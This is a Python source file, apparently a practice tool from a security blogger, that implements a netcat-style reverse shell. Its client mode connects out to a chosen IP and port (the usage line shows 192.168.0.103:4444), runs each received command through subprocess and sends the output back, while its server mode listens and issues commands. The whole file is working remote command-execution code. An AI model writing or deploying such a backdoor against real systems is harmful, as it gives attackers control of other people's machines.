#-*- coding:utf-8 -*-
# @Time    : 2020-05-14 14:45
# @Author  : nice0e3
# @FileName: python_nc
# @Software: PyCharm
# @Blog    ：https://www.cnblogs.com/nice0e3/
import socket
import sys
import subprocess
import getopt
def client(ip,port):
    #
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, port))
        while True:
            '''
            socket.recv(bufsize[, flags])
            从套接字接收数据。返回值是一个字节对象，表示接收到的数据。bufsize 指定一次接收的最大数据量。
            '''
            rcve_data = s.recv(1024)
            command = rcve_data.decode()
            command =command.strip()
            if command == 'exit':
                break
            else:
                '''
                subprocess.check_output(args, *, stdin=None, stderr=None, shell=False, cwd=None, encoding=None, errors=None, universal_newlines=None, timeout=None, text=None, **other_popen_kwargs)
                附带参数运行命令并返回其输出。
                '''
                output = subprocess.check_output(command)
                s.sendall(output)

    except Exception as e :
        print(e)

def server(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('',port))
    s.listen(5)
    '''
    socket.accept()
    接受一个连接。此 socket 必须绑定到一个地址上并且监听连接。
    返回值是一个 (conn, address) 对，其中 conn 是一个 新 的套接字对象，用于在此连接上收发数据，address 是连接另一端的套接字所绑定的地址。
    '''
    rcve_data, rcve_ip_port = s.accept()
    while True:
        # rcve_data, rcve_ip_port = s.accept()
        # print(rcve_data, rcve_ip_port)

        if rcve_data:
            command = input('$>')
            if command == 'exit':
                break
            else:
                rcve_data.sendall(command.encode())
                data = rcve_data.recv(1024)
                print(data.decode(encoding='GBK'))

def usage():
    print('this is the tool usage')
    print("server :python nc.py -l")
    print("client :python nc.py -i 192.168.0.103 -p 4444")

def main():
    if (len(sys.argv)<3):
        print('参数错误')
        usage()
    else:
        if len(sys.argv) >=3:
            '''
            getopt.getopt(args, shortopts, longopts=[])
            https://docs.python.org/zh-cn/3/library/getopt.html
            '''
            opts, args = getopt.getopt(sys.argv[1:], 'l:i:p:')
            for k, v in opts:
                if (k == '-l'):
                    prot =int(v)
                    server(prot)

                elif(k=='-i'):
                    ip = v
                elif(k=='-p'):
                    prot1 = int(v)
                    client(ip, prot1)





if __name__ == '__main__':
    main()
